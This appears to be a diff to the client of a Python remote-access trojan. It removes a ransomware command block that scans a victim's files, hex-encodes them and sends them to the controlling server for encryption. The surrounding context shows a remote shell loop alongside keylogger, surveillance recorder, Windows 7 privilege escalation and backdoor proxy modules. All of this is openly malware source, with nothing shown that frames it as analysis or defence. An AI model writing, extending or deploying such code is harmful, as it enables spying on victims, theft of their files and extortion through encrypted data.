@@ -15,7 +15,6 @@ keylogger = None
 recorder = None  
 privilege_escalator = None
 proxy_manager = None
-ransomware = None
 
 import sys
 import os
@@ -30,7 +29,6 @@ from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
 from features.proxy import create_backdoor_proxy
-from features.ransomware_client import create_ransomware_client
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -91,7 +89,7 @@ def download_file(file_name):
 
 # Main shell function for command execution with enhanced features
 def shell():
-    global keylogger, recorder, privilege_escalator, proxy_manager, ransomware
+    global keylogger, recorder, privilege_escalator, proxy_manager
     
     while True:
         # Receive a command from the remote host
@@ -435,89 +433,6 @@ def shell():
                 reliable_send("Privilege Report: " + json.dumps(brief_report, indent=2))
             except Exception as e:
                 reliable_send("Report error: " + str(e))
-        
-        # RANSOMWARE COMMANDS (Clean networking layer)
-        elif command == 'ransomware_init':
-            try:
-                if ransomware is None:
-                    ransomware = create_ransomware_client()
-                    session_id = f"session_{int(time.time())}"
-                    ransomware.set_session_id(session_id)
-                system_info = ransomware.get_system_info()
-                reliable_send("Ransomware initialized: " + json.dumps(system_info, indent=2))
-            except Exception as e:
-                reliable_send("Ransomware init error: " + str(e))
-                
-        elif command == 'ransomware_scan':
-            try:
-                if ransomware is None:
-                    ransomware = create_ransomware_client()
-                target_files = ransomware.scan_target_files(max_files=10)  # Limit for safety
-                reliable_send(f"Found {len(target_files)} target files")
-            except Exception as e:
-                reliable_send("Scan error: " + str(e))
-                
-        elif command.startswith('ransomware_encrypt '):
-            try:
-                if ransomware is None:
-                    ransomware = create_ransomware_client()
-                
-                # Parse number of files to encrypt
-                try:
-                    num_files = int(command.split()[1])
-                except:
-                    num_files = 5
-                
-                target_files = ransomware.scan_target_files(max_files=num_files)
-                if target_files:
-                    results = ransomware.prepare_files_batch_for_server(target_files)
-                    
-                    # Convert file data to hex for transmission
-                    prepared_files = []
-                    for file_info in results['prepared_files']:
-                        prepared_files.append({
-                            'file_path': file_info['file_path'],
-                            'file_data_hex': file_info['file_data'].hex(),
-                            'file_info': file_info['file_info']
-                        })
-                    
-                    # Send prepared data as JSON
-                    response_data = {
-                        'action': 'encrypt_batch',
-                        'session_id': ransomware.session_id,
-                        'prepared_files': prepared_files,
-                        'failed_files': results['failed']
-                    }
-                    reliable_send(json.dumps(response_data))
-                else:
-                    reliable_send("No target files found")
-            except Exception as e:
-                reliable_send("Encrypt error: " + str(e))
-                
-        elif command == 'ransomware_status':
-            try:
-                if ransomware is None:
-                    reliable_send("Ransomware not initialized")
-                else:
-                    encrypted_files = ransomware.get_encrypted_files_list()
-                    found_encrypted = ransomware.find_encrypted_files()
-                    status = {
-                        'session_id': ransomware.session_id,
-                        'logged_encrypted_files': len(encrypted_files) if isinstance(encrypted_files, list) else 0,
-                        'found_encrypted_files': len(found_encrypted)
-                    }
-                    reliable_send(json.dumps(status, indent=2))
-            except Exception as e:
-                reliable_send("Status error: " + str(e))
-                
-        elif command == 'ransomware_decrypt_attempt':
-            try:
-                if ransomware is None:
-                    ransomware = create_ransomware_client()
-                result = ransomware.attempt_decrypt()
-                reliable_send(json.dumps(result, indent=2))
-            except Exception as e:
-                reliable_send("Decrypt attempt error: " + str(e))
                 
         # FILE OPERATIONS
         elif command[:8] == 'download':
